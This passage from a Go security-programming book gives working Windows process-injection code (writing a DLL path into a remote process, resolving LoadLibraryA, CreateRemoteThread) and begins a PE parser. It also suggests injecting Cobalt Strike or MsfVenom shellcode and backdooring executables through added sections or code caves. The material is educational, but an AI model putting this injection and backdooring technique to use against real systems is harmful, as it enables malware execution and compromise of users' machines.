remote process’s memory region previously initialized using
the VirtualAllocEx() function. In Listing 12-9, we’ll keep things
simple by calling a DLL by file path, rather than writing the
entire DLL code into memory.
func WriteProcessMemory(i *Inject) error {
var nBytesWritten *byte
dllPathBytes, err := syscall.BytePtrFromString(i.DllPath) ❶
if err != nil {
return err
}
writeMem, _, lastErr := ProcWriteProcessMemory.Call(
i.RemoteProcHandle, // HANDLE hProcess
i.Lpaddr, // LPVOID lpBaseAddress
uintptr(unsafe.Pointer(dllPathBytes)), // LPCVOID lpBuffer ❷
uintptr(i.DLLSize), // SIZE_T nSize
uintptr(unsafe.Pointer(nBytesWritten))) // SIZE_T
*lpNumberOfBytesWritten
if writeMem == 0 {
return errors.Wrap(lastErr, "[!] ERROR : Can't write to process memory.")
}
return nil
}
Listing 12-9: Writing the DLL file path to remote process memory (/ch-
12/procInjector/winsys/inject.go)
The first noticeable syscall function is BytePtrFromString() ❶,
which is a convenience function that consumes a string and
returns the base index-0 pointer location of a byte slice, which
we’ll assign to dllPathBytes.
Finally, we get to see unsafe.Pointer in action. The third
argument to the ProcWriteProcessMemory.Call is defined within the
Windows API specification as “lpBuffer—a pointer to the buffer
that contains data to be written in the address space of the
specified process.” In order to pass the Go pointer value
defined in dllPathBytes over to the receiving Windows function,
we use unsafe.Pointer to circumvent type conversions. One final
point to make here is that uintptr and unsafe.Pointer ❷ are
acceptably safe, since both are being used inline and without
the intent of assigning the return value to a variable for later
reuse.
Finding LoadLibraryA with the GetProcessAddress
Windows API
Kernel32.dll exports a function called LoadLibraryA(), which is
available on all Windows versions. Microsoft documentation
states that LoadLibraryA() “loads the specified module into the
address space of the calling process. The specified module
may cause other modules to be loaded.” We need to obtain the
memory location of LoadLibraryA() before creating a remote
thread necessary to execute our actual process injection. We
can do this with the GetLoadLibAddress() function—one of those
supporting functions mentioned earlier (Listing 12-10).
func GetLoadLibAddress(i *Inject) error {
var llibBytePtr *byte
llibBytePtr, err := syscall.BytePtrFromString("LoadLibraryA") ❶
if err != nil {
return err
}
lladdr, _, lastErr := ProcGetProcAddress.Call❷(
ModKernel32.Handle(), // HMODULE hModule ❸
uintptr(unsafe.Pointer(llibBytePtr))) // LPCSTR lpProcName ❹
if &lladdr == nil {
return errors.Wrap(lastErr, "[!] ERROR : Can't get process address.")
}
i.LoadLibAddr = lladdr
fmt.Printf("[+] Kernel32.Dll memory address: %v\n",
unsafe.Pointer(ModKernel32.Handle()))
fmt.Printf("[+] Loader memory address: %v\n", unsafe.Pointer(i.LoadLibAddr))
return nil
}
Listing 12-10: Obtaining the LoadLibraryA() memory address by using the
GetProcessAddress() Windows function (/ch-12/procInjector/winsys/inject.go)
We use the GetProcessAddress() Windows function to identify
the base memory address of LoadLibraryA() necessary to call the
CreateRemoteThread() function. The ProcGetProcAddress.Call() ❷
function takes two arguments: the first is a handle to Kernel32.dll
❸ that contains the exported function we’re interested in
(LoadLibraryA()), and the second is the base index-0 pointer
location ❹ of a byte slice returned from the literal string
❶.
"LoadLibraryA"
Executing the Malicious DLL Using the
CreateRemoteThread Windows API
We’ll use the CreateRemoteThread() Windows function to create a
thread against the remote process’ virtual memory region. If
that region happens to be LoadLibraryA(), we now have a means
to load and execute the region of memory containing the file
path to our malicious DLL. Let’s review the code in Listing
12-11.
func CreateRemoteThread(i *Inject) error {
var threadId uint32 = 0
var dwCreationFlags uint32 = 0
remoteThread, _, lastErr := ProcCreateRemoteThread.Call❶(
i.RemoteProcHandle, // HANDLE hProcess ❷
uintptr(nullRef), // LPSECURITY_ATTRIBUTES lpThreadAttributes
uintptr(nullRef), // SIZE_T dwStackSize
i.LoadLibAddr, // LPTHREAD_START_ROUTINE lpStartAddress ❸
i.Lpaddr, // LPVOID lpParameter ❹
uintptr(dwCreationFlags), // DWORD dwCreationFlags
uintptr(unsafe.Pointer(&threadId)), // LPDWORD lpThreadId
)
if remoteThread == 0 {
return errors.Wrap(lastErr, "[!] ERROR : Can't Create Remote Thread.")
}
i.RThread = remoteThread
fmt.Printf("[+] Thread identifier created: %v\n", unsafe.Pointer(&threadId))
fmt.Printf("[+] Thread handle created: %v\n", unsafe.Pointer(i.RThread))
return nil
}
Listing 12-11: Executing the process injection by using the CreateRemoteThread()
Windows function (/ch-12 /procInjector/winsys/inject.go)
The ProcCreateRemoteThread.Call() ❶ function takes a total of
seven arguments, although we’ll use only three of them in this
example. The relevant arguments are RemoteProcHandle ❷
containing the victim process’s handle, LoadLibAddr ❸
containing the start routine to be called by the thread (in this
case, LoadLibraryA()), and, lastly, the pointer ❹ to the virtually
allocated memory holding the payload location.
Verifying Injection with the WaitforSingleObject
Windows API
We’ll use the WaitforSingleObject() Windows function to identify
when a particular object is in a signaled state. This is relevant
to process injection because we want to wait for our thread to
execute in order to avoid bailing out prematurely. Let’s briefly
discuss the function definition in Listing 12-12.
func WaitForSingleObject(i *Inject) error {
var dwMilliseconds uint32 = INFINITE
var dwExitCode uint32
rWaitValue, _, lastErr := ProcWaitForSingleObject.Call( ❶
i.RThread, // HANDLE hHandle
uintptr(dwMilliseconds)) // DWORD dwMilliseconds
if rWaitValue != 0 {
return errors.Wrap(lastErr, "[!] ERROR : Error returning thread wait state.")
}
success, _, lastErr := ProcGetExitCodeThread.Call( ❷
i.RThread, // HANDLE hThread
uintptr(unsafe.Pointer(&dwExitCode))) // LPDWORD lpExitCode
if success == 0 {
return errors.Wrap(lastErr, "[!] ERROR : Error returning thread exit code.")
}
closed, _, lastErr := ProcCloseHandle.Call(i.RThread) // HANDLE hObject ❸
if closed == 0 {
return errors.Wrap(lastErr, "[!] ERROR : Error closing thread handle.")
}
return nil
}
Listing 12-12: Using the WaitforSingleObject() Windows function to ensure successful
thread execution (/ch-12/procInjector/winsys/inject.go)
Three notable events are occurring in this code block. First,
the ProcWaitForSingleObject.Call() system call ❶ is passed the thread
handle returned in Listing 12-11. A wait value of INFINITE is
passed as the second argument to declare an infinite expiration
time associated with the event.
Next, ProcGetExitCodeThread.Call() ❷ determines whether the
thread terminated successfully. If it did, the LoadLibraryA
function should have been called, and our DLL will have been
executed. Finally, as we do for the responsible cleanup of
almost any handle, we passed the ProcCloseHandle.Call() system
call ❸ so that that thread object handle closes cleanly.
Cleaning Up with the VirtualFreeEx Windows API
We use the VirtualFreeEx() Windows function to release, or
decommit, the virtual memory that we allocated in Listing 12-
8 via VirtualAllocEx(). This is necessary to clean up memory
responsibly, since initialized memory regions can be rather
large, considering the overall size of the code being injected
into the remote process, such as an entire DLL. Let’s take a
look at this block of code (Listing 12-13).
func VirtualFreeEx(i *Inject) error {
var dwFreeType uint32 = MEM_RELEASE
var size uint32 = 0 //Size must be 0 to MEM_RELEASE all of the region
rFreeValue, _, lastErr := ProcVirtualFreeEx.Call❶(
i.RemoteProcHandle, // HANDLE hProcess ❷
i.Lpaddr, // LPVOID lpAddress ❸
uintptr(size), // SIZE_T dwSize ❹
uintptr(dwFreeType)) // DWORD dwFreeType ❺
if rFreeValue == 0 {
return errors.Wrap(lastErr, "[!] ERROR : Error freeing process memory.")
}
fmt.Println("[+] Success: Freed memory region")
return nil
}
Listing 12-13: Freeing virtual memory by using the VirtualFreeEx() Windows function
(/ch-12/procInjector /winsys/inject.go)
The ProcVirtualFreeEx.Call() function ❶ takes four arguments.
The first is the remote process handle ❷ associated with the
process that is to have its memory freed. The next argument is
a pointer ❸ to the location of memory to be freed.
Notice that a variable named size ❹ is assigned a 0 value.
This is necessary, as defined within the Windows API
specification, to release the entire region of memory back into
a reclaimable state. Finally, we pass the MEM_RELEASE
operation ❺ to completely free the process memory (and our
discussion on process injection).
Additional Exercises
Like many of the other chapters in this book, this chapter will
provide the most value if you code and experiment along the
way. Therefore, we conclude this section with a few
challenges or possibilities to expand upon the ideas already
covered:
One of the most important aspects of creating code injection is maintaining a
usable tool chain sufficient for inspecting and debugging process execution.
Download and install both the Process Hacker and Process Monitor tools. Then,
using Process Hacker, locate the memory addresses of both Kernel32 and
LoadLibrary. While you’re at it, locate the process handle and take a look at the
integrity level, along with inherent privileges. Now inject your code into the
same victim process and locate the thread.
You can expand the process injection example to be less trivial. For example,
instead of loading the payload from a disk file path, use MsfVenom or Cobalt
Strike to generate shellcode and load it directly into process memory. This will
require you to modify VirtualAllocEx and LoadLibrary.
Create a DLL and load the entire contents into memory. This is similar to the
previous exercise: the exception is that you’ll be loading an entire DLL rather
than shellcode. Use Process Monitor to set a path filter, process filter, or both,
and observe the system DLL load order. What prevents DLL load order
hijacking?
You can use a project called Frida (https://www.frida.re/) to inject the Google
Chrome V8 JavaScript engine into the victim process. It has a strong following
with mobile security practitioners as well as developers: you can use it to
perform runtime analysis, in-process debugging, and instrumentation. You can
also use Frida with other operating systems, such as Windows. Create your own
Go code, inject Frida into a victim process, and use Frida to run JavaScript
within the same process. Becoming familiar with the way Frida works will
require some research, but we promise it’s well worth it.
THE PORTABLE EXECUTABLE FILE
Sometimes we need a vehicle to deliver our malicious code.
This could be a newly minted executable (delivered through an
exploit in preexisting code), or a modified executable that
already exists on the system, for example. If we wanted to
modify an existing executable, we would need to understand
the structure of the Windows Portable Executable (PE) file
binary data format, as it dictates how to construct an
executable, along with the executable’s capabilities. In this
section, we’ll cover both the PE data structure and Go’s PE
package, and build a PE binary parser, which you can use to
navigate the structure of a PE binary.
Understanding the PE File Format
First, let’s discuss the PE data structure format. The Windows
PE file format is a data structure most often represented as an
executable, object code, or a DLL. The PE format also
maintains references for all resources used during the initial
operating system loading of the PE binary, including the
export address table (EAT) used to maintain exported
functions by ordinal, the export name table used to maintain
exported functions by name, the import address table (IAT),
import name table, thread local storage, and resource
management, among other structures. You can find the PE
format specification at https://docs.microsoft.com/en-
us/windows/win32/debug/pe-format/. Figure 12-6 shows the
PE data structure: a visual representation of a Windows
binary.
Figure 12-6: The Windows PE file format
We will examine each of these top-down sections as we
build out the PE parser.
Writing a PE Parser
Throughout the following sections, we will write the
individual parser components necessary to analyze each PE
section within the Windows binary executable. As an example,
we’ll use the PE format associated with the Telegram
messaging application binary located at https://telegram.org,
since this app is both less trivial than the often overused putty
SSH binary example, and is distributed as a PE format. You
can use almost any Windows binary executable, and we
encourage you to investigate others.
Loading the PE binary and File I/O
In Listing 12-14, we’ll start by using the Go PE package to
prepare the Telegram binary for further parsing. You can place
all the code that we create when writing this parser in a single
file within a main() function.
import (
❶ "debug/pe"
"encoding/binary"
"fmt"
"io"
"log"
"os"
)
func main() {
❷ f, err := os.Open("Telegram.exe")
check(err)
❸ pefile, err := pe.NewFile(f)
check(err)
defer f.Close()
defer pefile.Close()
Listing 12-14: File I/O for PE binary (/ch-12/peParser/main.go)
Prior to reviewing each of the PE structure components, we
need to stub out the initial import ❶ and file I/O by using the
Go PE package. We use os.Open() ❷ and then pe.NewFile() ❸ to
create a file handle and a PE file object, respectively. This is
necessary because we intend to parse the PE file contents by
using a Reader object, such as a file or binary reader.
Parsing the DOS Header and the DOS Stub
The first section of the top-down PE data structure illustrated
in Figure 12-6 starts with a DOS header. The following unique
value is always present within any Windows DOS-based
executable binary: 0x4D 0x5A (or MZ in ASCII), which aptly
declares the file as a Windows executable. Another value
universally present on all PE files is located at offset 0x3C. The
value at this offset points to another offset containing the
signature of a PE file: aptly, 0x50 0x45 0x00 0x00 (or PE in ASCII).
The header that immediately follows is the DOS Stub,
which always provides the hex values for This program cannot be run
in DOS mode; the exception to this occurs when a compiler’s
/STUB linker option provides an arbitrary string value. If you
take your favorite hex editor and open the Telegram
application, it should be similar to Figure 12-7. All of these
values are present.
Figure 12-7: A typical PE binary format file header
So far, we have described the DOS Header and Stub while
also looking at the hexadecimal representation through a hex
editor. Now, let’s take a look at parsing those same values
with Go code, as provided in Listing 12-15.
dosHeader := make([]byte, 96)
sizeOffset := make([]byte, 4)
// Dec to Ascii (searching for MZ)
_, err = f.Read(dosHeader) ❶
check(err)
fmt.Println("[-----DOS Header / Stub-----]")
fmt.Printf("[+] Magic Value: %s%s\n", string(dosHeader[0]),
string(dosHeader[1])) ❷
// Validate PE+0+0 (Valid PE format)
pe_sig_offset := int64(binary.LittleEndian.Uint32(dosHeader[0x3c:])) ❸
f.ReadAt(sizeOffset[:], pe_sig_offset) ❹
fmt.Println("[-----Signature Header-----]")
fmt.Printf("[+] LFANEW Value: %s\n", string(sizeOffset))
/* OUTPUT
[-----DOS Header / Stub-----]
[+] Magic Value: MZ
[-----Signature Header-----]
[+] LFANEW Value: PE
*/
Listing 12-15: Parsing the DOS Header and Stub values (/ch-12/peParser/main.go)
Starting from the beginning of the file, we use a Go file
Reader ❶ instance to read 96 bytes onward in order to confirm
the initial binary signature ❷. Recall that the first 2 bytes
provide the ASCII value MZ. The PE package offers
convenience objects to help marshal PE data structures into
something more easily consumable. It will, however, still
require manual binary readers and bitwise functionality to get
it there. We perform a binary read of the offset value ❸
referenced at 0x3c, and then read exactly 4 bytes ❹ composed
of the value 0x50 0x45 (PE) followed by 2 0x00 bytes.
Parsing the COFF File Header
Continuing down the PE file structure, and immediately
following the DOS Stub, is the COFF File Header. Let’s parse
the COFF File Header by using the code defined in Listing 12-
16, and then discuss some of its more interesting properties.
// Create the reader and read COFF Header
❶ sr := io.NewSectionReader(f, 0, 1<<63-1)
❷ _, err := sr.Seek(pe_sig_offset+4, os.SEEK_SET)
check(err)
❸ binary.Read(sr, binary.LittleEndian, &pefile.FileHeader)
Listing 12-16: Parsing the COFF File Header (/ch-12/peParser/main.go)
We create a new SectionReader ❶ that starts from the
beginning of the file at position 0 and reads to the max value
of an int64. Then the sr.Seek() function ❷ resets the position to
start reading immediately, following the PE signature offset
and value (recall the literal values PE + 0x00 + 0x00). Finally, we
perform a binary read ❸ to marshal the bytes into the pefile
object’s FileHeader struct. Recall that we created pefile earlier
when we called pe.Newfile().
The Go documentation defines type FileHeader with the struct
defined in Listing 12-17. This struct aligns quite well with
Microsoft’s documented PE COFF File Header format
(defined at https://docs.microsoft.com/en-
us/windows/win32/debug/pe-format#coff-file-header-object-
and-image/).
type FileHeader struct {
Machine uint16
NumberOfSections uint16
TimeDateStamp uint32
PointerToSymbolTable uint32
NumberOfSymbols uint32
SizeOfOptionalHeader uint16
Characteristics uint16
}
Listing 12-17: The Go PE package’s native PE File Header struct
The single item to note in this struct outside of the Machine
value (in other words, the PE target system architecture), is the
NumberOfSections property. This property contains the number of
sections defined within the Section Table, which immediately
follows the headers. You’ll need to update the NumberOfSections
value if you intend to backdoor a PE file by adding a new
section. However, other strategies may not require updating
this value, such as searching other executable sections (such as
CODE, .text, and so on) for contiguous unused 0x00 or 0xCC
values (a method to locate sections of memory that you can
use to implant shellcode), as the number of sections remain
unchanged.
In closing, you can use the following print statements to